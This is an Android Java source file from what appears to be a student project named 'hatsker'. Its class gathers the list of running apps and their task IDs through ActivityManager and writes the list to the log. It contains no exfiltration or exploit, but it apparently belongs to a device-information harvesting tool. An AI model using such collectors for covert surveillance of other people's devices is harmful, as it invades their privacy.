package com.example.student.hatsker;

import android.app.ActivityManager;
import android.content.Context;
import android.util.Log;

import java.util.List;

/**
 * Created by Игорь on 25.07.2017.
 */

public class RunningAppsGatherer implements Gatherer {

    RunningAppsGatherer(Context context)
    {
        getInfo(context);
    }

    @Override
    public String getInfo(Context context) {

        StringBuilder stringBuilder = new StringBuilder();

        stringBuilder.append("Executed apps:\n");

        final ActivityManager activityManager =
                (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        final List<ActivityManager.RunningTaskInfo> recentTasks =
                activityManager.getRunningTasks(Integer.MAX_VALUE);

        for (int i = 0; i < recentTasks.size(); i++) {
            stringBuilder.append("Application executed : " +
                    recentTasks.get(i).baseActivity.toShortString() +
                    "\t\t ID: " + recentTasks.get(i).id + "");
        }
        Log.i("asd",stringBuilder.toString());
        return  stringBuilder.toString();
    }
}
